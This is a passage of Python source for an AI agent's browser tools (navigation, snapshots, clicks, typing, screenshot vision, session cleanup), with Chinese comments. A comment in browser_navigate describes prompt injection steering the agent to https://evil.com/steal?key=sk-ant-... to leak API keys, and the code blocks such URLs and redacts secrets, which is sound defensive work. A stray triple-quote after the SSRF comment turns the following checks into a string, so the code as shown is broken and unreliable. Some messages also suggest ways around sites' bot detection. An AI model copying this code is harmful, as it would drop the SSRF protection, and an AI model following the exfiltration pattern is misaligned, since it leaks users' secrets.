            error_msg = stderr.strip() if stderr else f"Command failed with code {returncode}"
            logger.warning("browser '%s' failed (rc=%s): %s", command, returncode, error_msg[:300])
            return {"success": False, "error": error_msg}
        
        return {"success": True, "data": {}}
        
    except Exception as e:
        logger.warning("browser '%s' exception: %s", command, e, exc_info=True)
        return {"success": False, "error": str(e)}


def _extract_relevant_content(
    snapshot_text: str,
    user_task: Optional[str] = None
) -> str:
    """使用 LLM 根据用户任务从快照中提取相关内容。

    当没有配置辅助文本模型时回退到简单截断。
    """
    if user_task:
        extraction_prompt = (
            f"You are a content extractor for a browser automation agent.\n\n"
            f"The user's task is: {user_task}\n\n"
            f"Given the following page snapshot (accessibility tree representation), "
            f"extract and summarize the most relevant information for completing this task. Focus on:\n"
            f"1. Interactive elements (buttons, links, inputs) that might be needed\n"
            f"2. Text content relevant to the task (prices, descriptions, headings, important info)\n"
            f"3. Navigation structure if relevant\n\n"
            f"Keep ref IDs (like [ref=e5]) for interactive elements so the agent can use them.\n\n"
            f"Page Snapshot:\n{snapshot_text}\n\n"
            f"Provide a concise summary that preserves actionable information and relevant content."
        )
    else:
        extraction_prompt = (
            f"Summarize this page snapshot, preserving:\n"
            f"1. All interactive elements with their ref IDs (like [ref=e5])\n"
            f"2. Key text content and headings\n"
            f"3. Important information visible on the page\n\n"
            f"Page Snapshot:\n{snapshot_text}\n\n"
            f"Provide a concise summary focused on interactive elements and key content."
        )

    # 在发送到辅助 LLM 之前从快照中删除秘密。
    # 没有这个，显示环境变量或 API 密钥的页面会泄露
    # 秘密给提取模型，而 run_agent.py 的一般
    # 删除层还没有看到工具结果。
    from agent.redact import redact_sensitive_text
    extraction_prompt = redact_sensitive_text(extraction_prompt)

    try:
        call_kwargs = {
            "task": "web_extract",
            "messages": [{"role": "user", "content": extraction_prompt}],
            "max_tokens": 4000,
            "temperature": 0.1,
        }
        model = _get_extraction_model()
        if model:
            call_kwargs["model"] = model
        response = call_llm(**call_kwargs)
        extracted = (response.choices[0].message.content or "").strip() or _truncate_snapshot(snapshot_text)
        # Redact any secrets the auxiliary LLM may have echoed back.
        return redact_sensitive_text(extracted)
    except Exception:
        return _truncate_snapshot(snapshot_text)


def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
    """
    快照的简单截断后备。

    参数：
        snapshot_text: 要截断的快照文本
        max_chars: 保留的最大字符数

    返回：
        如果被截断则带指示器的截断文本
    """
    if len(snapshot_text) <= max_chars:
        return snapshot_text
    
    return snapshot_text[:max_chars] + "\n\n[... content truncated ...]"


# ============================================================================
# 浏览器工具函数
# ============================================================================

def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
    """
    在浏览器中导航到 URL。

    参数：
        url: 要导航到的 URL
        task_id: 用于会话隔离的任务标识符

    返回：
        带导航结果的 JSON 字符串（首次导航时包含隐身功能信息）
    """
    # 秘密泄露保护——阻止在查询参数中嵌入 API 密钥或
    # 令牌的 URL。提示注入可能诱骗代理
    # 导航到 https://evil.com/steal?key=sk-ant-... 以泄露秘密。
    from agent.redact import _PREFIX_RE
    if _PREFIX_RE.search(url):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL contains what appears to be an API key or token. "
                     "Secrets must not be sent in URLs.",
        })

    # SSRF 保护——在导航前阻止私有/内部地址。
    # 跳过本地后端（Camofox、没有云提供商的
    # 无头 Chromium），因为代理已经通过终端工具拥有完整的
    # 本地网络访问权限。也可以通过
    # 配置中的 ``browser.allow_private_urls`` 为云模式选择退出。
    """
    if not _is_local_backend() and not _allow_private_urls() and not _is_safe_url(url):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL targets a private or internal address",
        })

    # Website policy check — block before navigating
    blocked = check_website_access(url)
    if blocked:
        return json.dumps({
            "success": False,
            "error": blocked["message"],
            "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]},
        })

    # Camofox backend — delegate after safety checks pass
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_navigate
        return camofox_navigate(url, task_id)

    effective_task_id = task_id or "default"
    
    # Get session info to check if this is a new session
    # (will create one with features logged if not exists)
    session_info = _get_session_info(effective_task_id)
    is_first_nav = session_info.get("_first_nav", True)
    
    # Auto-start recording if configured and this is first navigation
    if is_first_nav:
        session_info["_first_nav"] = False
        _maybe_start_recording(effective_task_id)
    
    result = _run_browser_command(effective_task_id, "open", [url], timeout=max(_get_command_timeout(), 60))
    
    if result.get("success"):
        data = result.get("data", {})
        title = data.get("title", "")
        final_url = data.get("url", url)

            # 重定向后 SSRF 检查——如果浏览器跟随重定向到
        # 私有/内部地址，阻止结果以便模型无法通过后续
        # browser_snapshot 调用读取内部内容。
        # 跳过本地后端（与导航前检查相同的理由）。
        if not _is_local_backend() and not _allow_private_urls() and final_url and final_url != url and not _is_safe_url(final_url):
            # Navigate away to a blank page to prevent snapshot leaks
            _run_browser_command(effective_task_id, "open", ["about:blank"], timeout=10)
            return json.dumps({
                "success": False,
                "error": "Blocked: redirect landed on a private/internal address",
            })

        response = {
            "success": True,
            "url": final_url,
            "title": title
        }
        
        # 从标题/URL 检测常见的"阻止"页面模式
        blocked_patterns = [
            "access denied", "access to this page has been denied",
            "blocked", "bot detected", "verification required",
            "please verify", "are you a robot", "captcha",
            "cloudflare", "ddos protection", "checking your browser",
            "just a moment", "attention required"
        ]
        title_lower = title.lower()
        
        if any(pattern in title_lower for pattern in blocked_patterns):
            response["bot_detection_warning"] = (
                f"Page title '{title}' suggests bot detection. The site may have blocked this request. "
                "Options: 1) Try adding delays between actions, 2) Access different pages first, "
                "3) Enable advanced stealth (BROWSERBASE_ADVANCED_STEALTH=true, requires Scale plan), "
                "4) Some sites have very aggressive bot detection that may be unavoidable."
            )
        
        # 在首次导航时包含功能信息，以便模型知道哪些处于活动状态
        if is_first_nav and "features" in session_info:
            features = session_info["features"]
            active_features = [k for k, v in features.items() if v]
            if not features.get("proxies"):
                response["stealth_warning"] = (
                    "Running WITHOUT residential proxies. Bot detection may be more aggressive. "
                    "Consider upgrading Browserbase plan for proxy support."
                )
            response["stealth_features"] = active_features

        # 自动获取紧凑快照，以便模型可以立即行动，
        # 而无需单独的 browser_snapshot 调用。
        try:
            snap_result = _run_browser_command(effective_task_id, "snapshot", ["-c"])
            if snap_result.get("success"):
                snap_data = snap_result.get("data", {})
                snapshot_text = snap_data.get("snapshot", "")
                refs = snap_data.get("refs", {})
                if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
                    snapshot_text = _truncate_snapshot(snapshot_text)
                response["snapshot"] = snapshot_text
                response["element_count"] = len(refs) if refs else 0
        except Exception as e:
            logger.debug("Auto-snapshot after navigate failed: %s", e)

        return json.dumps(response, ensure_ascii=False)
    else:
        return json.dumps({
            "success": False,
            "error": result.get("error", "Navigation failed")
        }, ensure_ascii=False)


def browser_snapshot(
    full: bool = False,
    task_id: Optional[str] = None,
    user_task: Optional[str] = None
) -> str:
    """
    获取当前页面可访问性树的基于文本的快照。

    参数：
        full: 如果为 True，返回完整快照。如果为 False，返回紧凑视图。
        task_id: 用于会话隔离的任务标识符
        user_task: 用户当前的任务（用于任务感知提取）

    返回：
        带页面快照的 JSON 字符串
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_snapshot
        return camofox_snapshot(full, task_id, user_task)

    effective_task_id = task_id or "default"
    
    # Build command args based on full flag
    args = []
    if not full:
        args.extend(["-c"])  # Compact mode
    
    result = _run_browser_command(effective_task_id, "snapshot", args)
    
    if result.get("success"):
        data = result.get("data", {})
        snapshot_text = data.get("snapshot", "")
        refs = data.get("refs", {})
        
        # 检查快照是否需要摘要
        if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD and user_task:
            snapshot_text = _extract_relevant_content(snapshot_text, user_task)
        elif len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
            snapshot_text = _truncate_snapshot(snapshot_text)
        
        response = {
            "success": True,
            "snapshot": snapshot_text,
            "element_count": len(refs) if refs else 0
        }
        
        return json.dumps(response, ensure_ascii=False)
    else:
        return json.dumps({
            "success": False,
            "error": result.get("error", "Failed to get snapshot")
        }, ensure_ascii=False)


def browser_click(ref: str, task_id: Optional[str] = None) -> str:
    """
    点击元素。

    参数：
        ref: 元素引用（例如，"@e5"）
        task_id: 用于会话隔离的任务标识符

    返回：
        带点击结果的 JSON 字符串
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_click
        return camofox_click(ref, task_id)

    effective_task_id = task_id or "default"
    
    # Ensure ref starts with @
    if not ref.startswith("@"):
        ref = f"@{ref}"
    
    result = _run_browser_command(effective_task_id, "click", [ref])
    
    if result.get("success"):
        return json.dumps({
            "success": True,
            "clicked": ref
        }, ensure_ascii=False)
    else:
        return json.dumps({
            "success": False,
            "error": result.get("error", f"Failed to click {ref}")
        }, ensure_ascii=False)


def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
    """
    在输入字段中键入文本。

    参数：
        ref: 元素引用（例如，"@e3"）
        text: 要键入的文本
        task_id: 用于会话隔离的任务标识符

    返回：
        带类型结果的 JSON 字符串
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_type
        return camofox_type(ref, text, task_id)

    effective_task_id = task_id or "default"
    
    # Ensure ref starts with @
    if not ref.startswith("@"):
        ref = f"@{ref}"
    
    # 使用 fill 命令（清除然后键入）
    result = _run_browser_command(effective_task_id, "fill", [ref, text])
    
    if result.get("success"):
        return json.dumps({
            "success": True,
            "typed": text,
            "element": ref
        }, ensure_ascii=False)
    else:
        return json.dumps({
            "success": False,
            "error": result.get("error", f"Failed to type into {ref}")
        }, ensure_ascii=False)


def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
    """
    滚动页面。

    参数：
        direction: "up" 或 "down"
        task_id: 用于会话隔离的任务标识符

    返回：
        带滚动结果的 JSON 字符串
    """
    # Validate direction
    if direction not in ["up", "down"]:
        return json.dumps({
            "success": False,
            "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."
        }, ensure_ascii=False)

    # 重复滚动 5 次以获得有意义的页面移动。
    # 大多数后端每次滚动约 100px，几乎看不见。
    # 5 次大约是半个视口的行程，与后端无关。
    _SCROLL_REPEATS = 5

    if _is_camofox_mode():
        from tools.browser_camofox import camofox_scroll
        result = None
        for _ in range(_SCROLL_REPEATS):
            result = camofox_scroll(direction, task_id)
        return result

    effective_task_id = task_id or "default"

    result = None
    for _ in range(_SCROLL_REPEATS):
        result = _run_browser_command(effective_task_id, "scroll", [direction])
        if not result.get("success"):
            return json.dumps({
                "success": False,
                "error": result.get("error", f"Failed to scroll {direction}")
            }, ensure_ascii=False)

    return json.dumps({
        "success": True,
        "scrolled": direction
    }, ensure_ascii=False)


def browser_back(task_id: Optional[str] = None) -> str:
    """
    在浏览器历史中后退。

    参数：
        task_id: 用于会话隔离的任务标识符

    返回：
        带导航结果的 JSON 字符串
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_back
        return camofox_back(task_id)

    effective_task_id = task_id or "default"
    result = _run_browser_command(effective_task_id, "back", [])
    
    if result.get("success"):
        data = result.get("data", {})
        return json.dumps({
            "success": True,
            "url": data.get("url", "")
        }, ensure_ascii=False)
    else:
        return json.dumps({
            "success": False,
            "error": result.get("error", "Failed to go back")
        }, ensure_ascii=False)


def browser_press(key: str, task_id: Optional[str] = None) -> str:
    """
    按下键盘键。

    参数：
        key: 要按的键（例如，"Enter"、"Tab"）
        task_id: 用于会话隔离的任务标识符

    返回：
        带按键结果的 JSON 字符串
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_press
        return camofox_press(key, task_id)

    effective_task_id = task_id or "default"
    result = _run_browser_command(effective_task_id, "press", [key])
    
    if result.get("success"):
        return json.dumps({
            "success": True,
            "pressed": key
        }, ensure_ascii=False)
    else:
        return json.dumps({
            "success": False,
            "error": result.get("error", f"Failed to press {key}")
        }, ensure_ascii=False)





def browser_console(clear: bool = False, expression: Optional[str] = None, task_id: Optional[str] = None) -> str:
    """获取浏览器控制台消息和 JavaScript 错误，或在页面中评估 JS。

    当提供 ``expression`` 时，在页面上下文中评估 JavaScript
    （像 DevTools 控制台一样）并返回结果。否则返回
    控制台输出（log/warn/error/info）和未捕获的异常。

    参数：
        clear: 如果为 True，读取后清除消息/错误缓冲区
        expression: 要在页面上下文中评估的 JavaScript 表达式
        task_id: 用于会话隔离的任务标识符

    返回：
        带控制台消息/错误的 JSON 字符串，或评估结果
    """
    # --- JS 评估模式 ---
    if expression is not None:
        return _browser_eval(expression, task_id)

    # --- 控制台输出模式（原始行为）---
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_console
        return camofox_console(clear, task_id)

    effective_task_id = task_id or "default"
    
    console_args = ["--clear"] if clear else []
    error_args = ["--clear"] if clear else []
    
    console_result = _run_browser_command(effective_task_id, "console", console_args)
    errors_result = _run_browser_command(effective_task_id, "errors", error_args)
    
    messages = []
    if console_result.get("success"):
        for msg in console_result.get("data", {}).get("messages", []):
            messages.append({
                "type": msg.get("type", "log"),
                "text": msg.get("text", ""),
                "source": "console",
            })
    
    errors = []
    if errors_result.get("success"):
        for err in errors_result.get("data", {}).get("errors", []):
            errors.append({
                "message": err.get("message", ""),
                "source": "exception",
            })
    
    return json.dumps({
        "success": True,
        "console_messages": messages,
        "js_errors": errors,
        "total_messages": len(messages),
        "total_errors": len(errors),
    }, ensure_ascii=False)


def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
    """在页面上下文中评估 JavaScript 表达式并返回结果。"""
    if _is_camofox_mode():
        return _camofox_eval(expression, task_id)

    effective_task_id = task_id or "default"
    result = _run_browser_command(effective_task_id, "eval", [expression])

    if not result.get("success"):
        err = result.get("error", "eval failed")
        # 检测后端能力差距并给模型一个清晰的信号
        if any(hint in err.lower() for hint in ("unknown command", "not supported", "not found", "no such command")):
            return json.dumps({
                "success": False,
                "error": f"JavaScript evaluation is not supported by this browser backend. {err}",
            })
        return json.dumps({
            "success": False,
            "error": err,
        })

    data = result.get("data", {})
    raw_result = data.get("result")

    # eval 命令将 JS 结果作为字符串返回。如果字符串
    # 是有效的 JSON，解析它以便模型获得结构化数据。
    parsed = raw_result
    if isinstance(raw_result, str):
        try:
            parsed = json.loads(raw_result)
        except (json.JSONDecodeError, ValueError):
            pass  # keep as string

    return json.dumps({
        "success": True,
        "result": parsed,
        "result_type": type(parsed).__name__,
    }, ensure_ascii=False, default=str)


def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
    """通过 Camofox 的 /tabs/{tab_id}/eval 端点评估 JS（如果可用）。"""
    from tools.browser_camofox import _get_session, _ensure_tab, _post
    try:
        session = _get_session(task_id or "default")
        tab_id = _ensure_tab(session)
        resp = _post(f"/tabs/{tab_id}/eval", json_data={"expression": expression})

        # Camofox returns the result in a JSON envelope
        raw_result = resp.get("result") if isinstance(resp, dict) else resp
        parsed = raw_result
        if isinstance(raw_result, str):
            try:
                parsed = json.loads(raw_result)
            except (json.JSONDecodeError, ValueError):
                pass

        return json.dumps({
            "success": True,
            "result": parsed,
            "result_type": type(parsed).__name__,
        }, ensure_ascii=False, default=str)
    except Exception as e:
        error_msg = str(e)
        # 优雅降级——服务器可能不支持 eval
        if any(code in error_msg for code in ("404", "405", "501")):
            return json.dumps({
                "success": False,
                "error": "JavaScript evaluation is not supported by this Camofox server. "
                         "Use browser_snapshot or browser_vision to inspect page state.",
            })
        return tool_error(error_msg, success=False)


def _maybe_start_recording(task_id: str):
    """如果配置中启用了 browser.record_sessions 则开始录制。"""
    if task_id in _recording_sessions:
        return
    try:
        from kclaw_cli.config import read_raw_config
        kclaw_home = get_kclaw_home()
        cfg = read_raw_config()
        record_enabled = cfg.get("browser", {}).get("record_sessions", False)
        
        if not record_enabled:
            return
        
        recordings_dir = kclaw_home / "browser_recordings"
        recordings_dir.mkdir(parents=True, exist_ok=True)
        _cleanup_old_recordings(max_age_hours=72)
        
        import time
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        recording_path = recordings_dir / f"session_{timestamp}_{task_id[:16]}.webm"
        
        result = _run_browser_command(task_id, "record", ["start", str(recording_path)])
        if result.get("success"):
            _recording_sessions.add(task_id)
            logger.info("Auto-recording browser session %s to %s", task_id, recording_path)
        else:
            logger.debug("Could not start auto-recording: %s", result.get("error"))
    except Exception as e:
        logger.debug("Auto-recording setup failed: %s", e)


def _maybe_stop_recording(task_id: str):
    """如果此会话有活动录制则停止。"""
    if task_id not in _recording_sessions:
        return
    try:
        result = _run_browser_command(task_id, "record", ["stop"])
        if result.get("success"):
            path = result.get("data", {}).get("path", "")
            logger.info("Saved browser recording for session %s: %s", task_id, path)
    except Exception as e:
        logger.debug("Could not stop recording for %s: %s", task_id, e)
    finally:
        _recording_sessions.discard(task_id)


def browser_get_images(task_id: Optional[str] = None) -> str:
    """
    获取当前页面上的所有图像。

    参数：
        task_id: 用于会话隔离的任务标识符

    返回：
        带图像列表的 JSON 字符串（src 和 alt）
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_get_images
        return camofox_get_images(task_id)

    effective_task_id = task_id or "default"
    
    # Use eval to run JavaScript that extracts images
    js_code = """JSON.stringify(
        [...document.images].map(img => ({
            src: img.src,
            alt: img.alt || '',
            width: img.naturalWidth,
            height: img.naturalHeight
        })).filter(img => img.src && !img.src.startsWith('data:'))
    )"""
    
    result = _run_browser_command(effective_task_id, "eval", [js_code])
    
    if result.get("success"):
        data = result.get("data", {})
        raw_result = data.get("result", "[]")
        
        try:
            # Parse the JSON string returned by JavaScript
            if isinstance(raw_result, str):
                images = json.loads(raw_result)
            else:
                images = raw_result
            
            return json.dumps({
                "success": True,
                "images": images,
                "count": len(images)
            }, ensure_ascii=False)
        except json.JSONDecodeError:
            return json.dumps({
                "success": True,
                "images": [],
                "count": 0,
                "warning": "Could not parse image data"
            }, ensure_ascii=False)
    else:
        return json.dumps({
            "success": False,
            "error": result.get("error", "Failed to get images")
        }, ensure_ascii=False)


def browser_vision(question: str, annotate: bool = False, task_id: Optional[str] = None) -> str:
    """
    拍摄当前页面的截图并用视觉 AI 进行分析。

    此工具捕获浏览器中直观显示的内容并将其发送到
    Gemini 进行分析。对于理解文本快照可能无法捕获的
    视觉内容很有用（CAPTCHA、验证挑战、
    图像、复杂布局等）。

    截图被持久保存，其文件路径与
    分析结果一起返回，以便可以通过响应中的 MEDIA:<path> 与用户共享。

    参数：
        question: 你想在页面上直观了解什么
        annotate: 如果为 True，在交互元素上覆盖编号的 [N] 标签
        task_id: 用于会话隔离的任务标识符

    返回：
        带视觉分析结果和 screenshot_path 的 JSON 字符串
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_vision
        return camofox_vision(question, annotate, task_id)

    import base64
    import uuid as uuid_mod
    from pathlib import Path
    
    effective_task_id = task_id or "default"
    
    # Save screenshot to persistent location so it can be shared with users
    from kclaw_constants import get_kclaw_dir
    screenshots_dir = get_kclaw_dir("cache/screenshots", "browser_screenshots")
    screenshot_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
    
    try:
        screenshots_dir.mkdir(parents=True, exist_ok=True)

        # 删除旧截图（超过 24 小时）以防止无限磁盘增长
        _cleanup_old_screenshots(screenshots_dir, max_age_hours=24)
        
        # Take screenshot using agent-browser
        screenshot_args = []
        if annotate:
            screenshot_args.append("--annotate")
        screenshot_args.append("--full")
        screenshot_args.append(str(screenshot_path))
        result = _run_browser_command(
            effective_task_id, 
            "screenshot", 
            screenshot_args,
        )
        
        if not result.get("success"):
            error_detail = result.get("error", "Unknown error")
            _cp = _get_cloud_provider()
            mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
            return json.dumps({
                "success": False,
                "error": f"Failed to take screenshot ({mode} mode): {error_detail}"
            }, ensure_ascii=False)

        actual_screenshot_path = result.get("data", {}).get("path")
        if actual_screenshot_path:
            screenshot_path = Path(actual_screenshot_path)

        # Check if screenshot file was created
        if not screenshot_path.exists():
            _cp = _get_cloud_provider()
            mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
            return json.dumps({
                "success": False,
                "error": (
                    f"Screenshot file was not created at {screenshot_path} ({mode} mode). "
                    f"This may indicate a socket path issue (macOS /var/folders/), "
                    f"a missing Chromium install ('agent-browser install'), "
                    f"or a stale daemon process."
                ),
            }, ensure_ascii=False)
        
        # Read and convert to base64
        image_data = screenshot_path.read_bytes()
        image_base64 = base64.b64encode(image_data).decode("ascii")
        data_url = f"data:image/png;base64,{image_base64}"
        
        vision_prompt = (
            f"You are analyzing a screenshot of a web browser.\n\n"
            f"User's question: {question}\n\n"
            f"Provide a detailed and helpful answer based on what you see in the screenshot. "
            f"If there are interactive elements, describe them. If there are verification challenges "
            f"or CAPTCHAs, describe what type they are and what action might be needed. "
            f"Focus on answering the user's specific question."
        )

        # Use the centralized LLM router
        vision_model = _get_vision_model()
        logger.debug("browser_vision: analysing screenshot (%d bytes)",
                     len(image_data))

        # 从配置读取视觉超时（auxiliary.vision.timeout），默认 120s。
        # 本地视觉模型（llama.cpp、ollama）可能需要超过 30s
        # 进行截图分析，因此默认值必须充足。
        vision_timeout = 120.0
        try:
            from kclaw_cli.config import load_config
            _cfg = load_config()
            _vt = _cfg.get("auxiliary", {}).get("vision", {}).get("timeout")
            if _vt is not None:
                vision_timeout = float(_vt)
        except Exception:
            pass

        call_kwargs = {
            "task": "vision",
            "messages": [
                {
                    "role": "user",
                    "content": [
                        {"type": "text", "text": vision_prompt},
                        {"type": "image_url", "image_url": {"url": data_url}},
                    ],
                }
            ],
            "max_tokens": 2000,
            "temperature": 0.1,
            "timeout": vision_timeout,
        }
        if vision_model:
            call_kwargs["model"] = vision_model
        response = call_llm(**call_kwargs)
        
        analysis = (response.choices[0].message.content or "").strip()
        # Redact secrets the vision LLM may have read from the screenshot.
        from agent.redact import redact_sensitive_text
        analysis = redact_sensitive_text(analysis)
        response_data = {
            "success": True,
            "analysis": analysis or "Vision analysis returned no content.",
            "screenshot_path": str(screenshot_path),
        }
        # Include annotation data if annotated screenshot was taken
        if annotate and result.get("data", {}).get("annotations"):
            response_data["annotations"] = result["data"]["annotations"]
        return json.dumps(response_data, ensure_ascii=False)
    
    except Exception as e:
        # 如果截图成功捕获则保留截图——失败在 LLM 视觉分析，
        # 而不是捕获。删除有效的截图会丢失用户可能需要的证据。
        # _cleanup_old_screenshots 中的 24 小时清理可防止无限磁盘增长。
        logger.warning("browser_vision failed: %s", e, exc_info=True)
        error_info = {"success": False, "error": f"Error during vision analysis: {str(e)}"}
        if screenshot_path.exists():
            error_info["screenshot_path"] = str(screenshot_path)
            error_info["note"] = "Screenshot was captured but vision analysis failed. You can still share it via MEDIA:<path>."
        return json.dumps(error_info, ensure_ascii=False)


def _cleanup_old_screenshots(screenshots_dir, max_age_hours=24):
    """删除超过 max_age_hours 的浏览器截图以防止磁盘膨胀。

    节流为每个目录每小时最多运行一次，以避免在
    大量截图的工作流中重复扫描。
    """
    key = str(screenshots_dir)
    now = time.time()
    if now - _last_screenshot_cleanup_by_dir.get(key, 0.0) < 3600:
        return
    _last_screenshot_cleanup_by_dir[key] = now

    try:
        cutoff = time.time() - (max_age_hours * 3600)
        for f in screenshots_dir.glob("browser_screenshot_*.png"):
            try:
                if f.stat().st_mtime < cutoff:
                    f.unlink()
            except Exception as e:
                logger.debug("Failed to clean old screenshot %s: %s", f, e)
    except Exception as e:
        logger.debug("Screenshot cleanup error (non-critical): %s", e)


def _cleanup_old_recordings(max_age_hours=72):
    """删除超过 max_age_hours 的浏览器录制以防止磁盘膨胀。"""
    import time
    try:
        kclaw_home = get_kclaw_home()
        recordings_dir = kclaw_home / "browser_recordings"
        if not recordings_dir.exists():
            return
        cutoff = time.time() - (max_age_hours * 3600)
        for f in recordings_dir.glob("session_*.webm"):
            try:
                if f.stat().st_mtime < cutoff:
                    f.unlink()
            except Exception as e:
                logger.debug("Failed to clean old recording %s: %s", f, e)
    except Exception as e:
        logger.debug("Recording cleanup error (non-critical): %s", e)


# ============================================================================
# 清理和管理函数
# ============================================================================

def cleanup_browser(task_id: Optional[str] = None) -> None:
    """
    清理任务的浏览器会话。

    在任务完成或达到 inactivity 超时时自动调用。
    关闭 agent-browser/Browserbase 会话和 Camofox 会话。

    参数：
        task_id: 要清理的任务标识符
    """
    if task_id is None:
        task_id = "default"

    # 如果在 Camofox 模式下运行，也清理 Camofox 会话。
    # 当启用托管持久性时跳过完全关闭——浏览器
    # 配置文件（及其会话 cookie）必须在代理任务之间保持存活。
    # inactivity 收割者仍然释放空闲资源。
    if _is_camofox_mode():
        try:
            from tools.browser_camofox import camofox_close, camofox_soft_cleanup
            if not camofox_soft_cleanup(task_id):
                camofox_close(task_id)
        except Exception as e:
            logger.debug("Camofox cleanup for task %s: %s", task_id, e)

    logger.debug("cleanup_browser called for task_id: %s", task_id)
    logger.debug("Active sessions: %s", list(_active_sessions.keys()))

    # 检查会话是否存在（在锁下），但暂不删除——
    # _run_browser_command 需要它来构建关闭命令。
    with _cleanup_lock:
        session_info = _active_sessions.get(task_id)
    
    if session_info:
        bb_session_id = session_info.get("bb_session_id", "unknown")
        logger.debug("Found session for task %s: bb_session_id=%s", task_id, bb_session_id)
        
        # 关闭前停止自动录制（保存文件）
        _maybe_stop_recording(task_id)
        
        # 首先尝试通过 agent-browser 关闭（需要 _active_sessions 中的会话）
        try:
            _run_browser_command(task_id, "close", [], timeout=10)
            logger.debug("agent-browser close command completed for task %s", task_id)
        except Exception as e:
            logger.warning("agent-browser close failed for task %s: %s", task_id, e)
        
        # Now remove from tracking under lock
        with _cleanup_lock:
            _active_sessions.pop(task_id, None)
            _session_last_activity.pop(task_id, None)
        
        # Cloud mode: close the cloud browser session via provider API
        if bb_session_id:
            provider = _get_cloud_provider()
            if provider is not None:
                try:
                    provider.close_session(bb_session_id)
                except Exception as e:
                    logger.warning("Could not close cloud browser session: %s", e)
        
        # 终止守护进程并清理套接字目录
        session_name = session_info.get("session_name", "")
        if session_name:
            socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{session_name}")
            if os.path.exists(socket_dir):
                # agent-browser writes {session}.pid in the socket dir
                pid_file = os.path.join(socket_dir, f"{session_name}.pid")
                if os.path.isfile(pid_file):
                    try:
                        daemon_pid = int(Path(pid_file).read_text().strip())
                        os.kill(daemon_pid, signal.SIGTERM)
                        logger.debug("Killed daemon pid %s for %s", daemon_pid, session_name)
                    except (ProcessLookupError, ValueError, PermissionError, OSError):
                        logger.debug("Could not kill daemon pid for %s (already dead or inaccessible)", session_name)
                shutil.rmtree(socket_dir, ignore_errors=True)
        
        logger.debug("Removed task %s from active sessions", task_id)
    else:
        logger.debug("No active session found for task_id: %s", task_id)


def cleanup_all_browsers() -> None:
    """
    清理所有活动的浏览器会话。

    用于关闭时的清理。
    """
    with _cleanup_lock:
        task_ids = list(_active_sessions.keys())
    for task_id in task_ids:
        cleanup_browser(task_id)



# ============================================================================
# 需求检查
# ============================================================================

def check_browser_requirements() -> bool:
    """
    检查是否满足浏览器工具需求。

    在**本地模式**（未配置云提供商）：只需
    ``agent-browser`` CLI 可查找。

    在**云模式**（Browserbase、Browser Use 或 Firecrawl）：CLI
    *和*提供商的必需凭据必须存在。

    返回：
        如果满足所有需求则为 True，否则为 False
    """
    # Camofox backend — only needs the server URL, no agent-browser CLI
    if _is_camofox_mode():
        return True

    # The agent-browser CLI is always required
    try:
        _find_agent_browser()
    except FileNotFoundError:
        return False

    # In cloud mode, also require provider credentials
    provider = _get_cloud_provider()
    if provider is not None and not provider.is_configured():
        return False

    return True


# ============================================================================
# 模块测试
# ============================================================================

if __name__ == "__main__":
    """
    直接运行时的简单测试/演示
    """
    print("🌐 Browser Tool Module")
    print("=" * 40)

    _cp = _get_cloud_provider()
    mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
    print(f"   Mode: {mode}")
    
    # 检查需求
    if check_browser_requirements():
        print("✅ All requirements met")
    else:
        print("❌ Missing requirements:")
        try:
            _find_agent_browser()
        except FileNotFoundError:
            print("   - agent-browser CLI not found")
            print("     Install: npm install -g agent-browser && agent-browser install --with-deps")
        if _cp is not None and not _cp.is_configured():
            print(f"   - {_cp.provider_name()} credentials not configured")
            print("   Tip: set browser.cloud_provider to 'local' to use free local mode instead")
    
    print("\n📋 Available Browser Tools:")
    for schema in BROWSER_TOOL_SCHEMAS:
        print(f"  🔹 {schema['name']}: {schema['description'][:60]}...")
    
    print("\n💡 Usage:")
    print("  from tools.browser_tool import browser_navigate, browser_snapshot")
    print("  result = browser_navigate('https://example.com', task_id='my_task')")
    print("  snapshot = browser_snapshot(task_id='my_task')")


# ---------------------------------------------------------------------------
# 注册表
# ---------------------------------------------------------------------------
from tools.registry import registry, tool_error

_BROWSER_SCHEMA_MAP = {s["name"]: s for s in BROWSER_TOOL_SCHEMAS}

registry.register(
    name="browser_navigate",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_navigate"],
    handler=lambda args, **kw: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="🌐",
)
registry.register(
    name="browser_snapshot",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_snapshot"],
    handler=lambda args, **kw: browser_snapshot(
        full=args.get("full", False), task_id=kw.get("task_id"), user_task=kw.get("user_task")),
    check_fn=check_browser_requirements,
    emoji="📸",
)
registry.register(
    name="browser_click",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_click"],
    handler=lambda args, **kw: browser_click(ref=args.get("ref", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="👆",
)
registry.register(
    name="browser_type",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_type"],
